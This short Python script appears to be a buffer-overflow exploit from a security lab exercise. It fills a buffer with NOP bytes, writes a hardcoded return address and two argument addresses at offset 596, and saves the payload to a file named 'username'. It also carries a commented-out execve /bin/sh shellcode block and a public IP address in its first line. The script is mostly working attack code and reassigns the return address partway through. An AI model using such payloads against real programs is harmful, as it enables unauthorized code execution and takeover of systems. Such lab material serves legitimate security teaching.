#public ip : 20.197.40.54

import sys 
 
# shellcode= ( 
# "\x31\xc0" 
# "\x50"  
# "\x68""//sh" 
# "\x68""/bin" 
# "\x89\xe3" 
# "\x50" 
# "\x53" 
# "\x89\xe1" 
# "\x99" 
# "\xb0\x0b" 
# "\xcd\x80" 
# ).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1345)) 
ret = 0x5555555551e9
arg1 = 0x7fffffffc470
arg2 = 0x7fffffffc478
 
# Put the address at offset 112 
ret = 0xffffd158 -450
s = 592 + 4
content[s:s+4] = (ret).to_bytes(4,byteorder='little')
content[s+4:s+8] = (arg1).to_bytes(4,byteorder='little') 
content[s+8:s+12] = (arg2).to_bytes(4,byteorder='little')

 
# Write the content to a file 
with open('username', 'wb') as f: 
    f.write(content) 

